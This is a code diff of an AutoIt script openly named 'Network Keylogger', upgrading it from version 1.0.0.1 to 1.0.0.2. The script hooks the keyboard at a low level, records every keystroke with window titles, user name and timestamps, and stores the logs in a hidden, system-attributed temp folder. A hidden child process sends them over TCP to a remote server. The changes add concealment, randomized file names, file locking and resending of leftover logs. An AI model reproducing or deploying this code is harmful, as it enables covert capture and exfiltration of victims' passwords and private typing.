@@ -1,6 +1,8 @@
 #cs
-	Network Keylogger v1.0.0.1 - Sends every key pressed in a computer to another computer, via TCP/IP.
-	Copyright © 2010 VittGam - NetworkKeylogger@VittGam.net
+	Network Keylogger v1.0.0.2
+	Copyright © 2010 VittGam
+	http://www.Net-Keylogger.VittGam.net/
+	Net-Keylogger@VittGam.net
 
 	License information:
 
@@ -19,20 +21,20 @@
 #ce
 
 ; Tested with AutoIt 3.3.6.0
-#NoTrayIcon
+;~ #NoTrayIcon
 #include <WinAPI.au3>
 #Region ;**** Directives created by AutoIt3Wrapper_GUI ****
 #AutoIt3Wrapper_icon=vittgam.ico
 #AutoIt3Wrapper_outfile=network_keylogger.exe
 #AutoIt3Wrapper_Compression=4
-#AutoIt3Wrapper_Res_Comment=Network Keylogger v1.0.0.1 by VittGam
+#AutoIt3Wrapper_Res_Comment=Network Keylogger v1.0.0.2 by VittGam
 #AutoIt3Wrapper_Res_Description=Network Keylogger
-#AutoIt3Wrapper_Res_Fileversion=1.0.0.1
+#AutoIt3Wrapper_Res_Fileversion=1.0.0.2
 #AutoIt3Wrapper_Res_LegalCopyright=Copyright © 2010 VittGam
 #AutoIt3Wrapper_Res_Field=InternalName|network_keylogger
 #AutoIt3Wrapper_Res_Field=ProductName|Network Keylogger
 #AutoIt3Wrapper_Res_Field=CompanyName|VittGam (www.VittGam.net)
-#AutoIt3Wrapper_Res_Field=ProductVersion|1.0.0.1
+#AutoIt3Wrapper_Res_Field=ProductVersion|1.0.0.2
 #AutoIt3Wrapper_Res_Field=OriginalFilename|network_keylogger.exe
 #AutoIt3Wrapper_Res_SaveSource=n
 #AutoIt3Wrapper_Res_Language=1033
@@ -44,15 +46,47 @@
 Global $server_addr="server.vittgam.net"
 Global $server_port="12569"
 
-Global $keylog_filename=@TempDir&"\tempbuffer.txt"
+Global $keylog_dir=@TempDir&"\NKL"
+Global $keylog_fil=Random(1000000,9999999,1)
+Global $keylog_filename=$keylog_dir&"\"&$keylog_fil&".txt"
+If DirCreate($keylog_dir) = 0 Then
+	Exit
+EndIf
+FileSetAttrib($keylog_dir,"+SH")
 Global $buffer=""
 Global $connected=0
 Global $socket=-1
+Global $init_timer=0
 If $CmdLine[0] > 0 Then
-	If Execute("$CmdLine[1]") = "/child" And Execute("$CmdLine[2]") <> "" Then
+	If Execute("$CmdLine[1]") = "/child" And Execute("$CmdLine[2]") <> "" And Execute("$CmdLine[3]") <> "" Then
 		TCPStartup()
 		OnAutoItExitRegister("Cleanup2")
+		$keylog_fil=Execute("$CmdLine[3]")
+		$keylog_filename=$keylog_dir&"\"&$keylog_fil&".txt"
+		Global $templist=ProcessList(StringTrimLeft(@AutoItExe,StringInStr(@AutoItExe,"\",0,-1)))
+		If Not @error And ($templist[0][0] < 3) Then
+			Global $search=FileFindFirstFile($keylog_dir&"\*")
+			If Not @error And $search <> -1 Then
+				Global $fname=""
+				While 1
+					$fname=FileFindNextFile($search)
+					If @error Then ExitLoop
+					If Not @extended And (StringRight($fname,4) <> ".lok") And ($keylog_dir&"\"&$fname <> $keylog_filename) Then
+						Lock($keylog_dir&"\"&$fname,1)
+						$socket=TCPConnect(TCPNameToIP($server_addr),$server_port)
+						If $socket <> -1 Then
+							TCPSend($socket,FileRead($keylog_dir&"\"&$fname))
+							If Not @error Then FileDelete($keylog_dir&"\"&$fname)
+						EndIf
+						TCPCloseSocket($socket)
+						Lock($keylog_dir&"\"&$fname,0)
+					EndIf
+				WEnd
+			EndIf
+			FileClose($search)
+		EndIf
 		While 1
+			Lock($keylog_filename,1)
 			$buffer=FileRead($keylog_filename)
 			If $buffer <> "" Then
 				If $connected Then
@@ -61,28 +95,31 @@ If $CmdLine[0] > 0 Then
 						TCPCloseSocket($socket)
 						$connected=0
 					Else
-						FileClose(FileOpen($keylog_filename,2))
+						FileDelete($keylog_filename)
 					EndIf
 				EndIf
-				If Not $connected Then
+				If (Not $connected) And (TimerDiff($init_timer) > 59999) Then
 					$socket=TCPConnect(TCPNameToIP($server_addr),$server_port)
 					If $socket = -1 Then
 						TCPCloseSocket($socket)
+						$init_timer=TimerInit()
 					Else
 						$connected=1
 						TCPSend($socket,$buffer)
 						If @error Then
 							TCPCloseSocket($socket)
 							$connected=0
-							Sleep(10000)
+							$init_timer=TimerInit()
 						Else
-							FileClose(FileOpen($keylog_filename,2))
+							FileDelete($keylog_filename)
 						EndIf
 					EndIf
 				EndIf
 			EndIf
+			Lock($keylog_filename,0)
 			If Not ProcessExists(Execute("$CmdLine[2]")) Then
 				If FileRead($keylog_filename) = "" Then FileDelete($keylog_filename)
+				DirRemove($keylog_dir)
 				Exit
 			EndIf
 			Sleep(750)
@@ -106,7 +143,7 @@ Global $keys_13="{PAUSE}"
 Global $keys_14="{CAPSLOCK0}"
 Global $keys_14_on="{CAPSLOCK1}"
 Global $keys_1B="{ESC}"
-Global $keys_20=" "
+Global $keys_20="{SPACE}"
 Global $keys_21="{PAGEUP}"
 Global $keys_22="{PAGEDOWN}"
 Global $keys_23="{END}"
@@ -232,6 +269,7 @@ Global $keys_DD="ì"
 Global $keys_DE="à"
 Global $doing=0
 Global $childpid=-1
+Global $lockbuffer=""
 Logger("Keylogger started")
 Global $new=WinGetTitle("[active]")
 Global $old=$new
@@ -240,6 +278,7 @@ Global $hStub_KeyProc=DllCallbackRegister("_KeyProc","long","int;wparam;lparam")
 Global $hmod=_WinAPI_GetModuleHandle(0)
 Global $hHook=_WinAPI_SetWindowsHookEx($WH_KEYBOARD_LL,DllCallbackGetPtr($hStub_KeyProc),$hmod)
 OnAutoItExitRegister("Cleanup")
+AdlibRegister("FlushLockBuffer",250)
 While 1
 	If Not $doing Then
 		$new=WinGetTitle("[active]")
@@ -250,16 +289,50 @@ While 1
 	EndIf
 	If Not ProcessExists($childpid) Then
 		If @Compiled Then
-			$childpid=Run('"'&@AutoItExe&'" /child '&@AutoItPID,@ScriptDir,@SW_HIDE)
+			$childpid=Run('"'&@AutoItExe&'" /child '&@AutoItPID&' '&$keylog_fil,@WorkingDir,@SW_HIDE)
 		Else
-			$childpid=Run('"'&@AutoItExe&'" "'&@ScriptFullPath&'" /child '&@AutoItPID,@ScriptDir,@SW_HIDE)
+			$childpid=Run('"'&@AutoItExe&'" "'&@ScriptFullPath&'" /child '&@AutoItPID&' '&$keylog_fil,@WorkingDir,@SW_HIDE)
 		EndIf
 	EndIf
 	Sleep(750)
 WEnd
-Func Logger($string1,$string2="")
+Func Lock($lockname,$lock,$return=0)
+	$lockname=$lockname&".lok"
+	If $lock Then
+		Local $temppid=""
+		While FileExists($lockname)
+			$temppid=FileRead($lockname)
+			If $temppid = @AutoItPID Or $temppid = "" Or (Not ProcessExists($temppid)) Then
+				FileDelete($lockname)
+				ExitLoop
+			EndIf
+			If $return Then Return 0
+			Sleep(500)
+		WEnd
+		FileWrite($lockname,@AutoItPID)
+	Else
+		$temppid=FileRead($lockname)
+		If $temppid = @AutoItPID Or $temppid = "" Or (Not ProcessExists($temppid)) Then
+			FileDelete($lockname)
+		Else
+			Return 0
+		EndIf
+	EndIf
+	Return 1
+EndFunc
+Func FlushLockBuffer()
+	Logger("","",0)
+EndFunc
+Func Logger($string1,$string2="",$force_write=0)
 	If $string1 <> "" Then $string2&=@CRLF&"["&$string1&", User: "&@UserName&", Time: "&@MDAY&"/"&@MON&"/"&@YEAR&" "&@HOUR&":"&@MIN&":"&@SEC&"]"&@CRLF
-	If $string2 <> "" Then FileWrite($keylog_filename,$string2)
+	If $string2 <> "" Then $lockbuffer&=$string2
+	If $lockbuffer <> "" Then
+		If Lock($keylog_filename,1,1) Or $force_write Then
+			FileWrite($keylog_filename,$lockbuffer)
+			$lockbuffer=""
+		EndIf
+		Lock($keylog_filename,0)
+	EndIf
 EndFunc
 Func _KeyProc($nCode,$wParam,$lParam)
 	Local $tKEYHOOKS=DllStructCreate("dword vkCode;dword scanCode;dword flags;dword time;ulong_ptr dwExtraInfo",$lParam)
@@ -290,7 +363,7 @@ Func _KeyProc($nCode,$wParam,$lParam)
 		EndIf
 		If ($keycode = "90" Or $keycode = "91" Or $keycode = "14") Then
 			Local $keystatus=DllCall("user32.dll","short","GetKeyState","int",Dec($keycode))
-			If Not $keystatus[0] Then $tmp_text=Eval("keys_"&$keycode&"_on") ; "Not" because the key has already been pressed.
+			If (Not @error) And (Not $keystatus[0]) Then $tmp_text=Eval("keys_"&$keycode&"_on") ; "Not" because the key has already been pressed.
 		EndIf
 		If $tmp_text = "" Then $tmp_text="{!"&$keycode&"}"
 		If Eval("keys_"&$keycode&"_used") <> 1 Then Logger("",$tmp_text)
@@ -301,13 +374,15 @@ Func _KeyProc($nCode,$wParam,$lParam)
 	Return _WinAPI_CallNextHookEx($hHook,$nCode,$wParam,$lParam)
 EndFunc
 Func Cleanup()
+	AdlibUnRegister()
 	_WinAPI_UnhookWindowsHookEx($hHook)
 	DllCallbackFree($hStub_KeyProc)
-	Logger("Keylogger exited correctly")
+	Logger("Keylogger exited correctly","",1)
 	Exit
 EndFunc
 Func Cleanup2()
 	TCPCloseSocket($socket)
 	TCPShutdown()
+	Lock($keylog_filename,0)
 	Exit
 EndFunc
